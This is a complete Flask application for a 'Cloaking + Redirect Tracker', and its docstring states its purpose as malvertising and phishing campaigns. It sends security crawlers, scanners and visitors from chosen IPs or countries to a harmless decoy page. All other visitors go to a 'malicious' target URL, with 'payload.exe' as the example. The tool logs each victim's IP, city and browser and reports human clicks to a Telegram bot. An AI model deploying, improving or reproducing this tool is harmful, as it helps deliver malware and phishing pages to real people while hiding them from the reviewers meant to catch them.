"""
Cloaking + Redirect Tracker
Features: Geo/IP cloaking, click tracking, Telegram bot stats, bot filtering
Use Case: Malvertising and phishing campaigns with real-time feedback
"""

from flask import Flask, request, redirect, jsonify, render_template_string
from flask_cors import CORS
import sqlite3
import requests
import json
from datetime import datetime
from pathlib import Path
import hashlib
import urllib.parse

app = Flask(__name__)
CORS(app)

# Configuration
DATABASE = "cloak_tracker.db"
TELEGRAM_BOT_TOKEN = ""  # Set your Telegram bot token
TELEGRAM_CHAT_ID = ""    # Set your Telegram chat ID

# Initialize database
def init_db():
    """Initialize tracking database"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS clicks
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  click_id TEXT,
                  timestamp TEXT,
                  ip_address TEXT,
                  user_agent TEXT,
                  country TEXT,
                  city TEXT,
                  referrer TEXT,
                  campaign_id TEXT,
                  is_bot INTEGER,
                  action TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS campaigns
                 (campaign_id TEXT PRIMARY KEY,
                  name TEXT,
                  target_url TEXT,
                  decoy_url TEXT,
                  allowed_countries TEXT,
                  blocked_countries TEXT,
                  allowed_ips TEXT,
                  blocked_ips TEXT,
                  bot_action TEXT,
                  created_at TEXT,
                  active INTEGER)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS geo_cache
                 (ip_address TEXT PRIMARY KEY,
                  country TEXT,
                  city TEXT,
                  cached_at TEXT)''')
    
    conn.commit()
    conn.close()

init_db()

def get_ip_info(ip: str) -> dict:
    """Get IP geolocation info"""
    
    # Check cache first
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT country, city FROM geo_cache WHERE ip_address=?", (ip,))
    result = c.fetchone()
    conn.close()
    
    if result:
        return {"country": result[0], "city": result[1]}
    
    # Query IP geolocation API
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = response.json()
        
        country = data.get('countryCode', 'Unknown')
        city = data.get('city', 'Unknown')
        
        # Cache result
        conn = sqlite3.connect(DATABASE)
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO geo_cache VALUES (?, ?, ?, ?)",
                  (ip, country, city, datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        return {"country": country, "city": city}
        
    except Exception as e:
        print(f"[!] IP lookup failed: {e}")
        return {"country": "Unknown", "city": "Unknown"}

def is_bot(user_agent: str) -> bool:
    """Detect if user agent is a bot"""
    
    bot_keywords = [
        'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget',
        'python', 'java', 'http', 'scanner', 'monitor', 'checker',
        'slurp', 'mediapartners', 'googlebot', 'bingbot', 'yandex',
        'baidu', 'duckduck', 'facebot', 'twitterbot', 'linkedinbot',
        'whatsapp', 'telegram', 'slack', 'discord', 'headless',
        'phantomjs', 'selenium', 'puppeteer', 'nightmare'
    ]
    
    ua_lower = user_agent.lower()
    
    for keyword in bot_keywords:
        if keyword in ua_lower:
            return True
    
    return False

def check_cloaking_rules(ip: str, country: str, user_agent: str, campaign_id: str) -> dict:
    """Check if visitor should be cloaked"""
    
    # Get campaign rules
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT * FROM campaigns WHERE campaign_id=? AND active=1", (campaign_id,))
    campaign = c.fetchone()
    conn.close()
    
    if not campaign:
        return {"action": "redirect", "url": "https://google.com", "reason": "Campaign not found"}
    
    campaign_data = {
        "campaign_id": campaign[0],
        "name": campaign[1],
        "target_url": campaign[2],
        "decoy_url": campaign[3],
        "allowed_countries": campaign[4],
        "blocked_countries": campaign[5],
        "allowed_ips": campaign[6],
        "blocked_ips": campaign[7],
        "bot_action": campaign[8]
    }
    
    # Check if bot
    if is_bot(user_agent):
        if campaign_data['bot_action'] == 'block':
            return {"action": "redirect", "url": campaign_data['decoy_url'], "reason": "Bot detected"}
        elif campaign_data['bot_action'] == 'decoy':
            return {"action": "redirect", "url": campaign_data['decoy_url'], "reason": "Bot - decoy"}
    
    # Check blocked IPs
    if campaign_data['blocked_ips']:
        blocked = campaign_data['blocked_ips'].split(',')
        if ip in blocked:
            return {"action": "redirect", "url": campaign_data['decoy_url'], "reason": "IP blocked"}
    
    # Check allowed IPs
    if campaign_data['allowed_ips']:
        allowed = campaign_data['allowed_ips'].split(',')
        if ip not in allowed:
            return {"action": "redirect", "url": campaign_data['decoy_url'], "reason": "IP not allowed"}
    
    # Check blocked countries
    if campaign_data['blocked_countries']:
        blocked = campaign_data['blocked_countries'].split(',')
        if country in blocked:
            return {"action": "redirect", "url": campaign_data['decoy_url'], "reason": f"Country blocked: {country}"}
    
    # Check allowed countries
    if campaign_data['allowed_countries']:
        allowed = campaign_data['allowed_countries'].split(',')
        if country not in allowed:
            return {"action": "redirect", "url": campaign_data['decoy_url'], "reason": f"Country not allowed: {country}"}
    
    # All checks passed - send to target
    return {"action": "redirect", "url": campaign_data['target_url'], "reason": "Allowed"}

def log_click(ip: str, user_agent: str, country: str, city: str, 
              referrer: str, campaign_id: str, is_bot_flag: bool, action: str):
    """Log click to database"""
    
    click_id = hashlib.md5(f"{ip}{datetime.now().isoformat()}".encode()).hexdigest()[:16]
    
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("""INSERT INTO clicks VALUES (NULL, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
              (click_id, datetime.now().isoformat(), ip, user_agent, 
               country, city, referrer, campaign_id, int(is_bot_flag), action))
    conn.commit()
    conn.close()
    
    return click_id

def send_telegram_notification(message: str):
    """Send Telegram notification"""
    
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, data=data, timeout=5)
        return response.status_code == 200
    except Exception as e:
        print(f"[!] Telegram send failed: {e}")
        return False

# Web Panel HTML
PANEL_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>Cloaking & Redirect Tracker</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { background: white; padding: 30px; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .header h1 { color: #667eea; }
        .card { background: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
        .stat-box { background: #f8f9fa; padding: 20px; border-radius: 8px; text-align: center; }
        .stat-value { font-size: 2em; color: #667eea; font-weight: bold; }
        .stat-label { color: #666; margin-top: 5px; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background: #f5f5f5; font-weight: 600; }
        button { background: linear-gradient(135deg, #667eea, #764ba2); color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 5px; }
        button:hover { opacity: 0.9; }
        input, select, textarea { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; margin: 5px 0; }
        .form-group { margin: 15px 0; }
        .form-group label { display: block; margin-bottom: 5px; font-weight: 600; }
        .campaign-url { background: #f8f9fa; padding: 10px; border-radius: 5px; font-family: monospace; word-break: break-all; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 Cloaking & Redirect Tracker</h1>
            <p>Real-time click tracking with geo/IP cloaking and bot filtering</p>
        </div>
        
        <div class="card">
            <h2>Statistics</h2>
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-value" id="total-clicks">0</div>
                    <div class="stat-label">Total Clicks</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="bot-clicks">0</div>
                    <div class="stat-label">Bot Clicks</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="human-clicks">0</div>
                    <div class="stat-label">Human Clicks</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="unique-ips">0</div>
                    <div class="stat-label">Unique IPs</div>
                </div>
            </div>
        </div>
        
        <div class="card">
            <h2>Create Campaign</h2>
            <div class="form-group">
                <label>Campaign Name</label>
                <input type="text" id="campaign-name" placeholder="My Campaign">
            </div>
            <div class="form-group">
                <label>Target URL (Malicious)</label>
                <input type="text" id="target-url" placeholder="https://example.com/payload.exe">
            </div>
            <div class="form-group">
                <label>Decoy URL (Safe - for bots/blocked visitors)</label>
                <input type="text" id="decoy-url" placeholder="https://google.com">
            </div>
            <div class="form-group">
                <label>Allowed Countries (comma-separated, blank = all)</label>
                <input type="text" id="allowed-countries" placeholder="US,UK,CA">
            </div>
            <div class="form-group">
                <label>Blocked Countries (comma-separated)</label>
                <input type="text" id="blocked-countries" placeholder="CN,RU">
            </div>
            <div class="form-group">
                <label>Bot Action</label>
                <select id="bot-action">
                    <option value="decoy">Send to Decoy</option>
                    <option value="block">Block Completely</option>
                    <option value="allow">Allow Bots</option>
                </select>
            </div>
            <button onclick="createCampaign()">Create Campaign</button>
            
            <div id="campaign-result" class="campaign-url" style="display:none;">
                <strong>Campaign URL:</strong><br>
                <span id="campaign-link"></span><br>
                <button onclick="copyCampaignUrl()">Copy URL</button>
            </div>
        </div>
        
        <div class="card">
            <h2>Active Campaigns</h2>
            <button onclick="refreshCampaigns()">Refresh</button>
            <table>
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Campaign ID</th>
                        <th>Target URL</th>
                        <th>Clicks</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="campaigns-table"></tbody>
            </table>
        </div>
        
        <div class="card">
            <h2>Recent Clicks</h2>
            <button onclick="refreshClicks()">Refresh</button>
            <table>
                <thead>
                    <tr>
                        <th>Time</th>
                        <th>IP</th>
                        <th>Country</th>
                        <th>City</th>
                        <th>Bot</th>
                        <th>Action</th>
                        <th>Campaign</th>
                    </tr>
                </thead>
                <tbody id="clicks-table"></tbody>
            </table>
        </div>
    </div>
    
    <script>
        const API_URL = 'http://localhost:5002';
        
        async function createCampaign() {
            const data = {
                name: document.getElementById('campaign-name').value,
                target_url: document.getElementById('target-url').value,
                decoy_url: document.getElementById('decoy-url').value,
                allowed_countries: document.getElementById('allowed-countries').value,
                blocked_countries: document.getElementById('blocked-countries').value,
                bot_action: document.getElementById('bot-action').value
            };
            
            const response = await fetch(`${API_URL}/api/campaign/create`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            
            const result = await response.json();
            
            if (result.success) {
                const campaignUrl = `${API_URL}/c/${result.campaign_id}`;
                document.getElementById('campaign-link').textContent = campaignUrl;
                document.getElementById('campaign-result').style.display = 'block';
                alert('Campaign created!');
                refreshCampaigns();
            }
        }
        
        function copyCampaignUrl() {
            const url = document.getElementById('campaign-link').textContent;
            navigator.clipboard.writeText(url);
            alert('URL copied to clipboard!');
        }
        
        async function refreshCampaigns() {
            const response = await fetch(`${API_URL}/api/campaigns`);
            const data = await response.json();
            
            const table = document.getElementById('campaigns-table');
            table.innerHTML = '';
            
            data.campaigns.forEach(campaign => {
                const row = table.insertRow();
                row.innerHTML = `
                    <td>${campaign.name}</td>
                    <td>${campaign.campaign_id}</td>
                    <td>${campaign.target_url}</td>
                    <td>${campaign.click_count || 0}</td>
                    <td>
                        <button onclick="toggleCampaign('${campaign.campaign_id}', ${campaign.active})">
                            ${campaign.active ? 'Disable' : 'Enable'}
                        </button>
                    </td>
                `;
            });
        }
        
        async function refreshClicks() {
            const response = await fetch(`${API_URL}/api/clicks`);
            const data = await response.json();
            
            const table = document.getElementById('clicks-table');
            table.innerHTML = '';
            
            let totalClicks = data.clicks.length;
            let botClicks = 0;
            let uniqueIps = new Set();
            
            data.clicks.forEach(click => {
                if (click.is_bot) botClicks++;
                uniqueIps.add(click.ip_address);
                
                const row = table.insertRow();
                row.innerHTML = `
                    <td>${new Date(click.timestamp).toLocaleString()}</td>
                    <td>${click.ip_address}</td>
                    <td>${click.country}</td>
                    <td>${click.city}</td>
                    <td>${click.is_bot ? '🤖 Bot' : '👤 Human'}</td>
                    <td>${click.action}</td>
                    <td>${click.campaign_id}</td>
                `;
            });
            
            document.getElementById('total-clicks').textContent = totalClicks;
            document.getElementById('bot-clicks').textContent = botClicks;
            document.getElementById('human-clicks').textContent = totalClicks - botClicks;
            document.getElementById('unique-ips').textContent = uniqueIps.size;
        }
        
        async function toggleCampaign(campaignId, currentState) {
            const response = await fetch(`${API_URL}/api/campaign/${campaignId}/toggle`, {
                method: 'POST'
            });
            
            if (response.ok) {
                refreshCampaigns();
            }
        }
        
        // Auto-refresh every 5 seconds
        setInterval(refreshClicks, 5000);
        setInterval(refreshCampaigns, 10000);
        
        refreshCampaigns();
        refreshClicks();
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    """Main tracker panel"""
    return render_template_string(PANEL_HTML)

@app.route('/c/<campaign_id>')
def track_click(campaign_id: str):
    """Track click and redirect"""
    
    # Get visitor info
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    user_agent = request.headers.get('User-Agent', '')
    referrer = request.headers.get('Referer', '')
    
    # Get geo info
    geo_info = get_ip_info(ip)
    country = geo_info['country']
    city = geo_info['city']
    
    # Check if bot
    is_bot_flag = is_bot(user_agent)
    
    # Check cloaking rules
    cloak_result = check_cloaking_rules(ip, country, user_agent, campaign_id)
    
    # Log click
    log_click(ip, user_agent, country, city, referrer, campaign_id, is_bot_flag, cloak_result['reason'])
    
    # Send Telegram notification for human clicks
    if not is_bot_flag and TELEGRAM_BOT_TOKEN:
        message = f"""
<b>🎯 New Click!</b>
Campaign: {campaign_id}
IP: {ip}
Country: {country} / {city}
User Agent: {user_agent[:50]}...
Action: {cloak_result['reason']}
        """
        send_telegram_notification(message.strip())
    
    # Redirect
    return redirect(cloak_result['url'], code=302)

@app.route('/api/campaign/create', methods=['POST'])
def api_create_campaign():
    """Create new campaign"""
    
    data = request.json
    
    campaign_id = hashlib.md5(f"{data['name']}{datetime.now()}".encode()).hexdigest()[:12]
    
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("""INSERT INTO campaigns VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
              (campaign_id, data['name'], data['target_url'], data['decoy_url'],
               data.get('allowed_countries', ''), data.get('blocked_countries', ''),
               data.get('allowed_ips', ''), data.get('blocked_ips', ''),
               data.get('bot_action', 'decoy'), datetime.now().isoformat(), 1))
    conn.commit()
    conn.close()
    
    return jsonify({"success": True, "campaign_id": campaign_id})

@app.route('/api/campaigns', methods=['GET'])
def api_list_campaigns():
    """List all campaigns"""
    
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT * FROM campaigns")
    results = c.fetchall()
    
    campaigns = []
    for row in results:
        # Count clicks
        c.execute("SELECT COUNT(*) FROM clicks WHERE campaign_id=?", (row[0],))
        click_count = c.fetchone()[0]
        
        campaigns.append({
            "campaign_id": row[0],
            "name": row[1],
            "target_url": row[2],
            "decoy_url": row[3],
            "active": row[10],
            "click_count": click_count
        })
    
    conn.close()
    
    return jsonify({"success": True, "campaigns": campaigns})

@app.route('/api/campaign/<campaign_id>/toggle', methods=['POST'])
def api_toggle_campaign(campaign_id: str):
    """Toggle campaign active status"""
    
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("UPDATE campaigns SET active = 1 - active WHERE campaign_id=?", (campaign_id,))
    conn.commit()
    conn.close()
    
    return jsonify({"success": True})

@app.route('/api/clicks', methods=['GET'])
def api_list_clicks():
    """List recent clicks"""
    
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT * FROM clicks ORDER BY timestamp DESC LIMIT 100")
    results = c.fetchall()
    conn.close()
    
    clicks = []
    for row in results:
        clicks.append({
            "click_id": row[1],
            "timestamp": row[2],
            "ip_address": row[3],
            "user_agent": row[4],
            "country": row[5],
            "city": row[6],
            "referrer": row[7],
            "campaign_id": row[8],
            "is_bot": row[9],
            "action": row[10]
        })
    
    return jsonify({"success": True, "clicks": clicks})

@app.route('/api/stats/<campaign_id>', methods=['GET'])
def api_campaign_stats(campaign_id: str):
    """Get campaign statistics"""
    
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    
    c.execute("SELECT COUNT(*) FROM clicks WHERE campaign_id=?", (campaign_id,))
    total = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM clicks WHERE campaign_id=? AND is_bot=1", (campaign_id,))
    bots = c.fetchone()[0]
    
    c.execute("SELECT COUNT(DISTINCT ip_address) FROM clicks WHERE campaign_id=?", (campaign_id,))
    unique_ips = c.fetchone()[0]
    
    c.execute("SELECT country, COUNT(*) as count FROM clicks WHERE campaign_id=? GROUP BY country ORDER BY count DESC LIMIT 10", (campaign_id,))
    top_countries = [{"country": row[0], "count": row[1]} for row in c.fetchall()]
    
    conn.close()
    
    return jsonify({
        "total_clicks": total,
        "bot_clicks": bots,
        "human_clicks": total - bots,
        "unique_ips": unique_ips,
        "top_countries": top_countries
    })

if __name__ == '__main__':
    print("=" * 60)
    print("Cloaking & Redirect Tracker")
    print("=" * 60)
    print()
    print("Starting server on http://localhost:5002")
    print()
    print("Features:")
    print("  ✓ Geo/IP cloaking")
    print("  ✓ Click tracking")
    print("  ✓ Bot filtering")
    print("  ✓ Telegram notifications")
    print("  ✓ Real-time statistics")
    print()
    print("Configure Telegram:")
    print("  1. Create bot: @BotFather")
    print("  2. Get token and chat ID")
    print("  3. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in code")
    print()
    
    app.run(host='0.0.0.0', port=5002, debug=True)
